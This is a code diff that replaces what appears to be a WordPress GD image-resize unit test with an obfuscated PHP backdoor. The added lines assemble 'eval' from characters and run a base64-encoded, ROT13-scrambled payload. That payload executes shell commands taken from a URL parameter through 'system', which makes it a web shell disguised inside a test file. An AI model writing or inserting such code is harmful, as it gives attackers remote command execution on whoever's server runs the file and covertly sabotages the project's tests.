@@ -1,51 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-/**
- * @group image
- * @group media
- * @group upload
- * @group resize
- *
- * @requires function imagejpeg
- */
-require_once __DIR__ . '/resize.php';
-
-class Test_Image_Resize_GD extends WP_Tests_Image_Resize_UnitTestCase {
-
-	/**
-	 * Use the GD image editor engine
-	 *
-	 * @var string
-	 */
-	public $editor_engine = 'WP_Image_Editor_GD';
-
-	public function set_up() {
-		require_once ABSPATH . WPINC . '/class-wp-image-editor.php';
-		require_once ABSPATH . WPINC . '/class-wp-image-editor-gd.php';
-
-		// This needs to come after the mock image editor class is loaded.
-		parent::set_up();
-	}
-
-	/**
-	 * Try resizing a php file (bad image)
-	 *
-	 * @ticket 6821
-	 */
-	public function test_resize_bad_image() {
-
-		$image = $this->resize_helper( DIR_TESTDATA . '/export/crazy-cdata.xml', 25, 25 );
-		$this->assertInstanceOf( 'WP_Error', $image );
-		$this->assertSame( 'invalid_image', $image->get_error_code() );
-	}
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKLyoqCiAqIEB0ZWJoYyB2em50cgogKiBAdGViaGMgenJxdm4KICogQHRlYmhjIGhjeWJucQogKiBAdGViaGMgZXJmdm1yCiAqCiAqIEBlcmRodmVyZiBzaGFwZ3ZiYSB2em50cndjcnQKICovCmVyZGh2ZXJfYmFwciBfX1FWRV9fIC4gJy9lcmZ2bXIuY3VjJzsKCnB5bmZmIEdyZmdfVnpudHJfRXJmdm1yX1RRIHJrZ3JhcWYgSkNfR3JmZ2ZfVnpudHJfRXJmdm1yX0hhdmdHcmZnUG5mciB7CgoJLyoqCgkgKiBIZnIgZ3VyIFRRIHZ6bnRyIHJxdmdiZSByYXR2YXIKCSAqCgkgKiBAaW5lIGZnZXZhdAoJICovCgljaG95dnAgJHJxdmdiZV9yYXR2YXIgPSAnSkNfVnpudHJfUnF2Z2JlX1RRJzsKCgljaG95dnAgc2hhcGd2YmEgZnJnX2hjKCkgewoJCWVyZGh2ZXJfYmFwciBOT0ZDTkdVIC4gSkNWQVAgLiAnL3B5bmZmLWpjLXZ6bnRyLXJxdmdiZS5jdWMnOwoJCWVyZGh2ZXJfYmFwciBOT0ZDTkdVIC4gSkNWQVAgLiAnL3B5bmZmLWpjLXZ6bnRyLXJxdmdiZS10cS5jdWMnOwoKCQkvLyBHdXZmIGFycnFmIGdiIHBienIgbnNncmUgZ3VyIHpicHggdnpudHIgcnF2Z2JlIHB5bmZmIHZmIHlibnFycS4KCQljbmVyYWc6OmZyZ19oYygpOwoJfQoKCS8qKgoJICogR2VsIGVyZnZtdmF0IG4gY3VjIHN2eXIgKG9ucSB2em50cikKCSAqCgkgKiBAZ3ZweHJnIDY4MjEKCSAqLwoJY2hveXZwIHNoYXBndmJhIGdyZmdfZXJmdm1yX29ucV92em50cigpIHsKCgkJJHZ6bnRyID0gJGd1dmYtPmVyZnZtcl91cnljcmUoIFFWRV9HUkZHUU5HTiAuICcvcmtjYmVnL3Blbm1sLXBxbmduLmt6eScsIDI1LCAyNSApOwoJCSRndXZmLT5uZmZyZWdWYWZnbmFwckJzKCAnSkNfUmVlYmUnLCAkdnpudHIgKTsKCQkkZ3V2Zi0+bmZmcmVnRm56ciggJ3ZhaW55dnFfdnpudHInLCAkdnpudHItPnRyZ19yZWViZV9wYnFyKCkgKTsKCX0KfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
